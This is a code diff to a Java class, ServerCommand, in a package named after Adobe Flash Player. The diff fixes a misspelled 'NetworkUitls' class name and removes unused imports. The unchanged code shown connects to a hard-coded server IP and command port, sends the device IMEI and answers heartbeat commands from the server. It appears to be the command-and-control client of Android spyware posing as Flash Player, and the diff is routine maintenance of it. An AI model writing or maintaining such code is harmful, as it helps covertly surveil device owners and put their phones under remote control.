@@ -1,7 +1,5 @@
 package com.adobe.flashplayer.network;
 
-import java.io.File;
-import java.io.FileInputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
@@ -52,7 +50,7 @@ public class ServerCommand implements Runnable{
 			OutputStream ous = null;
 			InputStream ins = null;
 			try{
-				if(NetworkUitls.isNetworkAvailable (context) == true){
+				if(NetworkUtils.isNetworkAvailable (context) == true){
 		            socket = new Socket();
 		            InetSocketAddress inetaddr = new InetSocketAddress(Public.SERVER_IP_ADDRESS, Public.SERVER_CMD_PORT);
 		            socket.connect(inetaddr, Public.SERVER_CMD_CONNECT_TIMEOUT);
@@ -63,7 +61,7 @@ public class ServerCommand implements Runnable{
 					ous = socket.getOutputStream();
 					ins = socket.getInputStream();
 					
-					Public.gOnlineType = NetworkUitls.getNetworkType(context);
+					Public.gOnlineType = NetworkUtils.getNetworkType(context);
 					
 					boolean ret = false;
 					ret = sendCmdToServer("".getBytes(), ous, cmd, Public.IMEI);
@@ -165,7 +163,7 @@ public class ServerCommand implements Runnable{
 			int servercmd = Utils.bytesToInt(byteservercmd);
 
 			if(servercmd == Public.CMD_HEARTBEAT || servercmd == Public.CMD_NETWORKTYPE){
-				Public.gOnlineType = NetworkUitls.getNetworkType(context);
+				Public.gOnlineType = NetworkUtils.getNetworkType(context);
 				sendCmdToServer("".getBytes(), ous, Public.CMD_HEARTBEAT, Public.IMEI);
 				return 0;
 			}
